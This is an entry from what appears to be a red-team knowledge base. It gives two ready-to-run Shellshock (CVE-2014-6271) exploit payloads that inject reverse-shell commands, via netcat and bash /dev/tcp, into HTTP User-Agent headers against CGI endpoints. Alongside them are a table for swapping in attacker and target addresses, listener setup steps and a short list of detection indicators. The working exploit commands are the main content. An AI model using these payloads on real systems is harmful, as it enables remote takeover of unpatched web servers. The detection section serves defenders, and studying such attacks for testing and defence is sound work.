---
id: 3d7cf28a-8028-4123-992d-5e63efde6043
name: Shellshock-HTTP-Request-Payload-for-Reverse-Shell
type: code
language: Bash
verified: true
created_at: '2023-04-06T03:55:56.991910+00:00'
updated_at: '2023-04-06T03:55:57.002278+00:00'
platforms:
  - Linux
tags:
  - shellshock
  - rce
  - payload
  - reverse-shell
validated: true
---

# Shellshock-HTTP-Request-Payload-for-Reverse-Shell

## Code

```bash
echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc 10.0.0.2 4444 -e /bin/sh\r\n"
curl --silent -k -H "User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.0.0.2/4444 0>&1" "https://10.0.0.1/cgi-bin/admin.cgi"
```

## Description

This Bash code snippet contains two example payloads for exploiting the Shellshock vulnerability (CVE-2014-6271) to establish a reverse shell. The first uses echo to craft an HTTP request with netcat for the shell, while the second uses curl with Bash's TCP redirection. These are injected via the User-Agent header to trick vulnerable CGI scripts into executing the commands.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| 10.0.0.2 | Attacker's IP address (replace with $_ATTACKER_IP) | 10.0.0.2 |
| 4444 | Attacker's listening port (replace with $_ATTACKER_PORT) | 4444 |
| 10.0.0.1 | Target server's IP or hostname (replace with $_TARGET_HOST) | 10.0.0.1 |
| /cgi-bin/status or /cgi-bin/admin.cgi | Vulnerable CGI endpoint path | /cgi-bin/admin.cgi |

## Usage

Execute these snippets after setting up a listener (e.g., nc -lvnp 4444) on the attacker machine. The payloads are designed for remote delivery over HTTP/HTTPS to Unix web servers with unpatched Bash. Use in red team exercises or vulnerability testing; customize IPs, ports, and endpoints based on reconnaissance.

## Detection

- Web server access logs showing User-Agent headers with '() {' or similar patterns.
- Network traffic analysis for anomalous outgoing connections from the web server to attacker IPs on high ports.
- Bash execution logs or process monitoring revealing unexpected nc or Bash TCP invocations.
- IDS/IPS rules matching Shellshock signatures (e.g., Snort rules for CVE-2014-6271).

## Related

- [[procedures/Exploit-Shellshock-Vulnerability-for-Remote-Code-Execution]]
- [[tools/Netcat]] (for listener setup)
